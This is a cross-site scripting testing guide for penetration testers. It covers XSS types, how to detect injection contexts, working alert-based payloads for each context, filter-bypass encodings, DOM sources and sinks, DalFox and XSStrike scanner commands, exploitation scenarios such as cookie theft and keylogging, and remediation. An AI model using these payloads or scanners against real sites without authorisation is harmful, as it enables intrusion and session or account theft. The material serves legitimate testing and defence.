# Cross-Site Scripting (XSS) Testing

## Overview
XSS enables attackers to inject client-side scripts into web pages viewed by other users. It can be used to steal session tokens, deface websites, redirect users, or perform actions on behalf of victims.

## Classification
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 4.3 - 9.6
- **MITRE ATT&CK:** T1189 (Drive-by Compromise)

## XSS Types

### Reflected XSS
User input is immediately reflected in the response without storage.

### Stored XSS
Malicious input is stored server-side and served to other users.

### DOM-Based XSS
Vulnerability exists in client-side JavaScript, not server-side processing.

## Detection Methodology

### 1. Input Reflection Analysis
1. Inject a unique canary string: `phantomXSS12345`
2. Search response for the canary
3. Determine injection context (HTML body, attribute, JavaScript, CSS, URL)
4. Craft context-appropriate payload

### 2. Context-Specific Payloads

**HTML Body Context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
```

**HTML Attribute Context:**
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><img src=x onerror=alert(1)>
```

**JavaScript String Context:**
```
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
```

**JavaScript Template Literal:**
```
${alert(1)}
```

**URL/href Context:**
```
javascript:alert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 3. Filter Bypass Techniques

**Case variation:** `<ScRiPt>alert(1)</ScRiPt>`

**Encoding bypasses:**
- HTML entity hex: `&#x3C;script&#x3E;`
- URL encoding: `%3Cscript%3E`
- Unicode: `\u003cscript\u003e`

**Without parentheses:** Use tagged template literals

**Alternative functions:** `confirm(1)`, `prompt(1)`

### 4. DOM XSS Sources and Sinks

**Sources (user-controllable):**
- location.href, location.search, location.hash
- window.name, postMessage data
- Web Storage (localStorage, sessionStorage)

**Sinks (dangerous operations):**
- innerHTML, outerHTML
- Script-creating functions (setTimeout with string arg, Function constructor)
- element.src, element.href
- jQuery .html(), .append()

## Tool Usage

### DalFox
```bash
dalfox url "http://target.com/search?q=test"
dalfox file urls.txt
cat urls.txt | dalfox pipe
dalfox url "http://target.com" --mining-dom
```

### XSStrike
```bash
xsstrike -u "http://target.com/search?q=test"
xsstrike -u "http://target.com" --crawl
```

## Exploitation Scenarios
- **Cookie theft:** Redirect cookies to attacker server via image src or fetch
- **Keylogging:** Capture keystrokes via onkeypress handler
- **Phishing:** Replace page content with fake login form
- **Account takeover:** Change email/password via authenticated API calls
- **Malware distribution:** Redirect to exploit kit

## Remediation
1. **Output encoding** - context-aware encoding (HTML, JS, URL, CSS)
2. **Content Security Policy** (CSP) - restrict script sources
3. **HTTPOnly cookies** - prevent cookie theft via script
4. **Input validation** - whitelist allowed characters
5. **Use safe framework APIs** - avoid raw HTML insertion methods
6. **Trusted Types API** - enforce safe DOM manipulation in browsers

## Evidence Collection
- Payload that triggered XSS
- Injection context identified
- Browser affected
- Impact assessment (cookie scope, CSP policy, httpOnly flags)
- Screenshot of triggered payload
